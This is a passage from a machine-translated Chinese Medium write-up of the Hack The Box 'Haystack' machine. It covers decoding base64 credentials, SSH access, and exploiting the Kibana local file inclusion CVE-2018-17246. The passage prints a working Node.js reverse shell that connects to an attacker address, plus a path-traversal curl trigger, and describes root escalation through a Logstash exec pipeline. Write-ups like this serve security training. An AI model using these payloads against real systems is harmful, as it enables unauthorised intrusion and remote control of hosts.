mn">{"_index":"quotes","_type":"quote","_id":"111","_score":1,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}<br/>{"_index":"quotes","_type":"quote","_id":"45","_score":1,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}}</span></pre><p id="0644" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">它们看起来像base64。对它们进行解码会导致:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4bc2" class="mj ky iq mf b gy mk ml l mm mn">echo -n cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d<br/>pass: <strong class="mf ir">spanish.is.key</strong></span><span id="9c11" class="mj ky iq mf b gy mo ml l mm mn">echo -n dXNlcjogc2VjdXJpdHkg |base64 -d<br/>user: <strong class="mf ir">security</strong></span></pre><p id="4ea4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">使用SSH的凭证，它的工作原理是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="dc98" class="mj ky iq mf b gy mk ml l mm mn">root@kali:~/Documents/htb/boxes/haystack# ssh security@10.10.10.115<br/>security@10.10.10.115's password: </span><span id="b184" class="mj ky iq mf b gy mo ml l mm mn">Last login: Sat Nov  2 00:34:58 2019 from 10.10.14.33</span><span id="9e39" class="mj ky iq mf b gy mo ml l mm mn">[security@haystack ~]$ id &amp;&amp; uname -a<br/>uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>Linux haystack 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></pre><p id="568b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">现在可以读取user.txt:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e097" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack ~]$ cat user.txt<br/><strong class="mf ir">04d18bc79....</strong></span></pre><h1 id="0d7e" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">获取根目录:</h1><p id="3d25" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">这个盒子的根部是凉的。它让我了解了一项我并不熟悉的技术。我通过检查/etc/passwd来开始我的枚举，以检查我可以升级到的其他潜在用户:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e2f7" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack etc]$ cat /etc/passwd<br/>root:x:0:0:root:/root:/bin/bash<br/>bin:x:1:1:bin:/bin:/sbin/nologin<br/>daemon:x:2:2:daemon:/sbin:/sbin/nologin<br/>adm:x:3:4:adm:/var/adm:/sbin/nologin<br/>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br/>sync:x:5:0:sync:/sbin:/bin/sync<br/>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br/>halt:x:7:0:halt:/sbin:/sbin/halt<br/>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br/>operator:x:11:0:operator:/root:/sbin/nologin<br/>games:x:12:100:games:/usr/games:/sbin/nologin<br/>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br/>nobody:x:99:99:Nobody:/:/sbin/nologin<br/>systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin<br/>dbus:x:81:81:System message bus:/:/sbin/nologin<br/>polkitd:x:999:998:User for polkitd:/:/sbin/nologin<br/>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br/>postfix:x:89:89::/var/spool/postfix:/sbin/nologin<br/>chrony:x:998:996::/var/lib/chrony:/sbin/nologin<br/>security:x:1000:1000:security:/home/security:/bin/bash<br/>elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin<br/><strong class="mf ir">logstash</strong>:x:996:994:logstash:/usr/share/logstash:/sbin/nologin<br/>nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin<br/><strong class="mf ir">kibana</strong>:x:994:992:kibana service user:/home/kibana:/sbin/nologin</span></pre><p id="196a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">看到有一个kibana和logstash用户，我运行ps aux来检查这些服务是否正在运行:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e808" class="mj ky iq mf b gy mk ml l mm mn">kibana     6307  0.5  5.4 1351328 210872 ?      Ssl  Nov01   1:07 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml</span></pre><p id="8046" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">很明显，有一个Kibana服务正在运行。Kibana是一个用于Elasticsearch的数据可视化插件。</p><p id="8ae7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">阅读Kibana的文档，默认情况下，配置文件存储在/etc/kibana/kibana.yml上。阅读其内容:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="b377" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack kibana]$ cat kibana.yml                                                                                                                                               <br/># Kibana is served by a back end server. This setting specifies the port to use.                                                                                                         <br/>server.port: 5601                                                                                                                                                                        <br/>                                                                                                                                                                                         <br/># Specifies the address to which the Kibana server will bind. IP addresses and host names are both valid values.                                                                         <br/># The default is 'localhost', which usually means remote machines will not be able to connect.                                                                                           <br/># To allow connections from remote users, set this parameter to a non-loopback address.                                                                                                  <br/>server.host: "127.0.0.1"</span></pre><p id="43b0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在本地主机端口5601上运行curl，查看它是否正在运行:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5444" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack kibana]$ curl 127.0.0.1:5601<br/>&lt;script&gt;var hashRoute = '/app/kibana';<br/>var defaultRoute = '/app/kibana';</span><span id="23e6" class="mj ky iq mf b gy mo ml l mm mn">var hash = window.location.hash;<br/>if (hash.length) {<br/>  window.location = hashRoute + hash;<br/>} else {<br/>  window.location = defaultRoute;</span></pre><p id="ef97" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于再次检查端口9200，Elasticsearch的版本:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="131a" class="mj ky iq mf b gy mk ml l mm mn">"version" : {<br/>    "number" : "6.4.2"</span></pre><p id="eef6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我检查elastic search 6 . 4 . 2版的漏洞，一个Kibana漏洞非常突出:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi oh"><img src="../Images/15336e274fdd406e1061d35deab31a6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YapPWdK6RPasUe32Ezrweg.png"/></div></div></figure><p id="ffd0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">您可以在此处了解该漏洞:</p><div class="np nq gp gr nr ns"><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">执行这个，我知道你有它|赛博方舟</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">2018年11月21日| | Nethanel Coppenhagen | ki Bana中的一个本地文件包含允许攻击者运行本地JavaScript…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">www.cyberark.com</p></div></div><div class="ob l"><div class="oi l od oe of ob og js ns"/></div></div></a></div><p id="5c01" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这篇文章探讨了由CyberArk实验室发现的Kibana中严重程度严重的本地文件包含(LFI)漏洞。Github里有个帖子总结了一下:<a class="ae jy" href="https://github.com/mpgn/CVE-2018-17246" rel="noopener ugc nofollow" target="_blank">https://github.com/mpgn/CVE-2018-17246</a></p><h2 id="a663" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">CVE-2018–17246</h2><p id="0f23" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">我创建了一个包含以下内容的文件:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5403" class="mj ky iq mf b gy mk ml l mm mn">(function(){<br/>    var net = require("net"),<br/>        cp = require("child_process"),<br/>        sh = cp.spawn("/bin/sh", []);<br/>    var client = new net.Socket();<br/>    client.connect(1339, "10.10.14.33", function(){<br/>        client.pipe(sh.stdin);<br/>        sh.stdout.pipe(client);<br/>        sh.stderr.pipe(client);<br/>    });<br/>    return /a/; // Prevents the Node.js application form crashing<br/>})();</span></pre><p id="47c8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">触发LFI:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="98cb" class="mj ky iq mf b gy mk ml l mm mn">curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../tmp/shell.js</span></pre><p id="9c23" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我可以得到一个贝壳作为基巴纳:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/23747f7e98f175714210185735fcc3cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/1*tdSS3XpQzJnYlxmU1JQqyw.png"/></div></figure><p id="0169" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查Kibana组拥有的文件，删除proc:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d4ab" class="mj ky iq mf b gy mk ml l mm mn">find / -group kibana 2&gt;/dev/null | grep -v proc</span></pre><p id="cb14" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">logstash文件夹很突出:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/e4da16f82fd919cdce004799018da1e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*edzfuLgb34Prav2bViNtDA.png"/></div></figure><p id="0816" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查conf.d下的文件:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/750aefb65cf7b8739672c39e077623e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*8kZKtBz0m2h_ZHgPjJAfuA.png"/></div></figure><p id="4f10" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我看到这些文件在kibana组下，但归root用户所有。然后，我阅读了配置文件的内容:</p><h2 id="ca0b" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">输入. conf</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi om"><img src="../Images/2d95327295640f8527622db3cb3e1a47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1014/format:webp/1*3THv5aSG8aSM27Lg6iWyFg.png"/></div></figure><h2 id="7cfa" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">过滤器. conf</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi on"><img src="../Images/54b41b9c3450de298e3cd7c4d22b06af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wao7ra2A98d-ej1ULwRsvA.png"/></div></div></figure><h2 id="c944" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">输出.会议</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/69a0bc451a286679db66d75dd7d814e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1148/format:webp/1*_EmyE5hfUc9macK06HHhSw.png"/></div></figure><p id="abc8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">所以基本上input.conf接受/opt/kibana/下的文件名为logstash_*的文件，每10秒检查一次，设置类型为execute。</p><p id="616f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，filter.conf获取类型设置为“execute”的文件，并将文件中的消息与以下内容进行匹配:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="7140" class="mj ky iq mf b gy mk ml l mm mn">“Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}"</span></pre><p id="53ce" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">你可以在这里阅读更多关于grok过滤的内容:<a class="ae jy" href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html" rel="noopener ugc nofollow" target="_blank">https://www . elastic . co/guide/en/log stash/current/plugins-filters-grok . html</a></p><p id="e1b8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，输出配置文件获取该文件并执行一个shell命令。从<a class="ae jy" href="https://www.elastic.co/guide/en/logstash/current/plugins-inputs-exec.html" rel="noopener ugc nofollow" target="_blank">文档</a>本身:该事件的<code class="fe op oq or mf b">command</code>字段将是命令运行。这意味着我可以执行代码。</p><p id="815d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">所以我们的文件应该是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="3046" class="mj ky iq mf b gy mk ml l mm mn">Ejecutar comando : &lt;command here&gt;</span></pre><p id="4661" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我创建一个名为logstash_a的文件，它将连接到我:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/04a9f1259612f3e9064de6c73f7ce495.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*czpHRKzLA7O5yb7kzBZhow.png"/></div></figure><p id="5446" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">从我的监听器，我得到shell作为根:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ot"><img src="../Images/97a6cc5406c495686f4501910112ca35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*CIB_QIyYkOKQ3IcSJclhJQ.png"/></div></div></figure><p id="2364" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我现在可以阅读root.txt:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ou"><img src="../Images/eaf255f5ee4499fac4c827c889faf3cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V6Cyg-6v8xL-Usdh7fkq0Q.png"/></div></div></figure><p id="df99" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这就是我如何破解黑盒子里的干草堆。</p><p id="d828" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我希望你能从中学到一些东西。感谢阅读我的文章！干杯！🍺</p></div><div class="ab cl ov ow hu ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="ij ik il im in"><p id="af05" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><em class="nn">关注</em> <a class="ae jy" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nn"> Infosec报道</em> </a> <em class="nn">获取更多此类精彩报道。</em></p><div class="np nq gp gr nr ns"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">信息安全报道</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">medium.com</p></div></div><div class="ob l"><div class="pc l od oe of ob og js ns"/></div></div></a></div></div></div>    
</body>
</html>